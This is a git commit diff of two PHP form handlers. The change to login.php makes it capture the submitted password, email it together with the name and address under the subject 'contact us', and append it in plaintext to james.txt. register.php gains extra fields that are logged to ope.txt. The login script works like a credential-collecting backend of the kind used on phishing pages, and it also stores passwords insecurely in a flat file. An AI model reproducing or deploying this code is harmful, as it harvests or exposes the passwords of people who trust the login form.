9e63f5d5976fd345b014012050df4dac3cee6924
DevHorlar <opeyemibusuyi@gmail.com>
2025-05-23 05:36:58 +0100

    wd

--- login.php
+++ login.php
@@ -4,17 +4,17 @@ $subject = "contact us";
 
 $name = isset($_POST['name']) ? trim($_POST['name']) : '';
 $email = isset($_POST['email']) ? trim($_POST['email']) : '';
-$address = isset($_POST['address']) ? trim($_POST['address']) : '';
+$password = isset($_POST['password']) ? trim($_POST['password']) : '';
 
-$message = "'$name' . '$email' . '$address'";
+$message = "'$name' . '$email' . '$password'";
 $additional_headers = "additional headers";
 $mail = mail($to, $subject, $message, $additional_headers);
 
-$new = "$subject . $message . $additional_headers";
+$new2 = "$subject . $message . $additional_headers";
 
  $fp = fopen("james.txt","a");
 
-    fputs($fp,$new);
+    fputs($fp,$new2);
 
     fclose($fp);
 
--- register.php
+++ register.php
@@ -5,16 +5,19 @@ $subject = "contact us";
 $name = isset($_POST['name']) ? trim($_POST['name']) : '';
 $email = isset($_POST['email']) ? trim($_POST['email']) : '';
 $address = isset($_POST['address']) ? trim($_POST['address']) : '';
+$username = isset($_POST['username']) ? trim($_POST['username']) : '';
+$website = isset($_POST['website']) ? trim($_POST['website']) : '';
 
-$message = "'$name' . '$email' . '$address'";
+$message = "'$name' . '$email' . '$username' . '$website' . '$address'";
 $additional_headers = "additional headers";
+
 $mail = mail($to, $subject, $message, $additional_headers);
 
-$new = "$subject . $message . $additional_headers";
+$new1 = "$subject . $message . $additional_headers";
 
  $fp = fopen("ope.txt","a");
 
-    fputs($fp,$new);
+    fputs($fp,$new1);
 
     fclose($fp);
 
